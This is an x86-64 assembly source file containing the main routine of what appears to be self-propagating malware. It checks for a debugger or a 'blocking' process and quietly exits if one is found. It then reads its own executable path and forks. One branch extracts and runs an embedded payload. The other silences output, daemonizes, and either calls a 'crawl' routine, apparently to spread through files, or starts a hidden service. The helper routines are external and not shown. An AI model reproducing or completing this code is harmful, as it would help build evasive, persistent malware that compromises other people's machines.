section .data
BLOCKING_PROCESS    db "BLOCKING_PROCESS", 0

exec_path_buf_size  equ 4096

section .bss
exec_ctx_av         resb 8
exec_ctx_envp       resb 8
exec_ctx_exec_path  resb exec_path_buf_size

section .text
global main
extern runningUnderDebugger
extern is_process_running
extern readlink
extern fork
extern extract_payload
extern exec_payload
extern mute_outputs
extern daemonize
extern crawl
extern run_service

I_AM_A_MISTAKE      equ -1
I_AM_MAIN_PROCESS   equ 0
I_AM_CHILD_PROCESS  equ 1

main:
    push    rbp
    mov     rbp, rsp
    sub     rsp, 32

    call    runningUnderDebugger
    test    eax, eax
    jne     return_zero

    lea     rdi, [rel BLOCKING_PROCESS]
    call    is_process_running
    test    eax, eax
    jne     return_zero

    mov     [exec_ctx_av], rsi
    mov     [exec_ctx_envp], rdx

    lea     rdi, [rel proc_self_exe_str]
    lea     rsi, [rel exec_ctx_exec_path]
    mov     edx, exec_path_buf_size
    call    readlink

    call    fork
    cmp     eax, -1
    je      return_zero

    cmp     eax, 0
    jne     parent_process

child_process:
    call    mute_outputs
    cmp     eax, -1
    je      return_zero

    call    daemonize
    mov     esi, eax

    cmp     esi, I_AM_A_MISTAKE
    je      return_zero

    cmp     esi, I_AM_MAIN_PROCESS
    je      main_process

    cmp     esi, I_AM_CHILD_PROCESS
    je      child_process_run_service

    jmp     return_zero

parent_process:
    sub     rsp, 16

    lea     rdi, [rel exec_ctx_exec_path]
    lea     rsi, [rsp]
    lea     rdx, [rsp + 8]
    call    extract_payload
    cmp     eax, 0
    jne     parent_return_zero

    lea     rdi, [rel exec_ctx_av]
    lea     rdi, [rel exec_ctx_av]

    mov     rsi, [rsp]
    mov     rdx, [rsp + 8]
    call    exec_payload

parent_return_zero:
    add     rsp, 16
    jmp     return_zero

main_process:
    lea     rdi, [rel exec_ctx_av]
    call    crawl
    jmp     return_zero

child_process_run_service:
    lea     rdi, [rel exec_ctx_exec_path]
    call    run_service
    jmp     return_zero

return_zero:
    mov     eax, 0
    leave
    ret

section .rodata
proc_self_exe_str:
    db "/proc/self/exe", 0